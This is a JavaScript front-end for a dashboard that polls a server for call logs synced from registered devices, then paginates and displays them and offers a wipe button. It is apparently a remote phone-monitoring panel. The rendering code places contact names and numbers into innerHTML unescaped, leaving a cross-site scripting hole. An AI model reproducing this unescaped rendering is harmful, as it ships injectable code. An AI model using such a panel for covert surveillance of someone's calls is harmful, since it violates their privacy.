class CallsEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        
        // 🚀 PAGINATION REGISTERS: High-speed local allocation state variables
        this.allData = [];
        this.currentPage = 1;
        this.itemsPerPage = 10;

        this.init();
    }

    async init() {
        this.setupPaginationListeners();
        await this.loadDevicesList();
        if (!this.activeDeviceId) return;
        
        this.fetchCalls();
        // 10 seconds high-speed telemetry polling loop
        setInterval(() => this.fetchCalls(), 10000);
    }

    // Bind event handlers strictly to the updated calls layout navigation tags
    setupPaginationListeners() {
        const prevBtn = document.getElementById('call-prev-btn');
        const nextBtn = document.getElementById('call-next-btn');

        if (prevBtn) {
            prevBtn.addEventListener('click', () => {
                if (this.currentPage > 1) {
                    this.currentPage--;
                    this.renderCurrentPage();
                }
            });
        }

        if (nextBtn) {
            nextBtn.addEventListener('click', () => {
                const totalPages = Math.ceil(this.allData.length / this.itemsPerPage) || 1;
                if (this.currentPage < totalPages) {
                    this.currentPage++;
                    this.renderCurrentPage();
                }
            });
        }
    }

    async loadDevicesList() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', { headers: { 'Authorization': `Bearer ${token}` } });
            const result = await res.json();
            if (result.status === 'success') {
                const selectEl = document.getElementById('device-select');
                if (selectEl) {
                    selectEl.innerHTML = '';
                    if (!result.data || result.data.length === 0) {
                        selectEl.innerHTML = '<option value="">No Devices Found</option>';
                        return;
                    }
                    result.data.forEach(dev => {
                        const option = document.createElement('option');
                        option.value = dev.id;
                        option.textContent = dev.name;
                        selectEl.appendChild(option);
                    });

                    if (!this.activeDeviceId && result.data.length > 0) {
                        this.activeDeviceId = result.data[0].id;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                    }
                    selectEl.value = this.activeDeviceId;

                    selectEl.addEventListener('change', (e) => {
                        this.activeDeviceId = e.target.value;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                        this.currentPage = 1; // Reset parameters back to page 1 on device target switch
                        this.fetchCalls();
                    });
                }
            }
        } catch (e) { console.error("Device list compilation failure:", e); }
    }

    async fetchCalls() {
        const token = localStorage.getItem('owner_token');
        if (!this.activeDeviceId) return;
        try {
            // 🚀 UPGRADED PAYLOAD CAP: Synchronized to fetch full 50 rows matching Flask logic metrics
            const res = await fetch(`/api/calls?device_id=${this.activeDeviceId}&limit=50`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                this.allData = result.data || [];
                this.renderCurrentPage();
            }
        } catch (e) { console.error("Telephony Sync Core Exception:", e); }
    }

    renderCurrentPage() {
        const container = document.getElementById('calls-list');
        if (!container) return;

        if (this.allData.length === 0) {
            container.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">No telephony logs captured yet. Awaiting device sync...</div>';
            this.updatePaginationUI(1);
            return;
        }

        // 🧠 DATA SLICING LAYER: Isolate the correct sub-array chunk index map
        const startIndex = (this.currentPage - 1) * this.itemsPerPage;
        const endIndex = startIndex + this.itemsPerPage;
        const slicedItems = this.allData.slice(startIndex, endIndex);

        container.innerHTML = slicedItems.map(c => {
            const isSaved = c.contact_name && c.contact_name !== 'Unknown' && c.contact_name.trim() !== '';
            const classificationClass = isSaved ? 'saved-contact' : 'unknown-contact';
            
            const nameMarkup = isSaved 
                ? `${c.contact_name} <span class="badge-identity badge-saved">Saved</span>` 
                : `Unknown Number <span class="badge-identity badge-unknown">Suspicious</span>`;

            let callType = String(c.type).toLowerCase();
            let typeLabel = 'INCOMING';
            let typeClass = 'type-incoming';

            if (callType === '2' || callType.includes('outgoing')) {
                typeLabel = 'OUTGOING'; typeClass = 'type-outgoing';
            } else if (callType === '3' || callType.includes('missed')) {
                typeLabel = 'MISSED'; typeClass = 'type-missed';
            }

            let durationText = '0s';
            if (c.duration > 0) {
                const mins = Math.floor(c.duration / 60);
                const secs = c.duration % 60;
                durationText = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
            }

            const dateObj = new Date(c.timestamp);
            const dateString = dateObj.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' });
            const timeString = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });

            return `
            <div class="call-card ${classificationClass}">
                <div class="call-meta-left">
                    <div class="call-icon-frame">
                        <i data-lucide="phone" style="width: 16px; height: 16px; color: #888;"></i>
                    </div>
                    <div class="call-details">
                        <span class="contact-identity">${nameMarkup}</span>
                        <span class="phone-raw-number">${c.phone_number}</span>
                        <span style="color: #aaa; font-size: 12px; margin-top: 2px;">Duration: <strong style="color: #fff;">${durationText}</strong></span>
                    </div>
                </div>
                <div class="call-meta-right">
                    <span class="badge-call-type ${typeClass}">${typeLabel}</span>
                    <span class="call-time-string">${dateString} • ${timeString}</span>
                </div>
            </div>
            `;
        }).join('');
        
        const totalPages = Math.ceil(this.allData.length / this.itemsPerPage) || 1;
        this.updatePaginationUI(totalPages);

        if (window.lucide) window.lucide.createIcons();
    }

    // 🚀 CONTROLS RENDERING NODE: Rewrites button disabled toggles state metrics in real-time
    updatePaginationUI(totalPages) {
        const prevBtn = document.getElementById('call-prev-btn');
        const nextBtn = document.getElementById('call-next-btn');
        const indicator = document.getElementById('call-page-num');

        // Boundary safety check: clamp back if logs got manually purged while being out of limits
        if (this.currentPage > totalPages) {
            this.currentPage = totalPages;
        }

        if (indicator) {
            indicator.textContent = `PAGE ${this.currentPage} OF ${totalPages}`;
        }
        if (prevBtn) {
            prevBtn.disabled = (this.currentPage === 1);
        }
        if (nextBtn) {
            nextBtn.disabled = (this.currentPage === totalPages);
        }
    }
}

window.wipeCallsHistory = async function() {
    if(!confirm("CRITICAL PROTOCOL: Permanently wipe all telephony logs?")) return;
    const token = localStorage.getItem('owner_token');
    const deviceId = localStorage.getItem('active_device_id');
    try {
        const res = await fetch('/api/calls/clear', {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: deviceId })
        });
        const result = await res.json();
        if(result.status === 'success') {
            alert("Database call logs wiped cleanly.");
            window.location.reload();
        }
    } catch(e) { console.error("Wipe command network failure:", e); }
};

document.addEventListener('DOMContentLoaded', () => new CallsEngine());
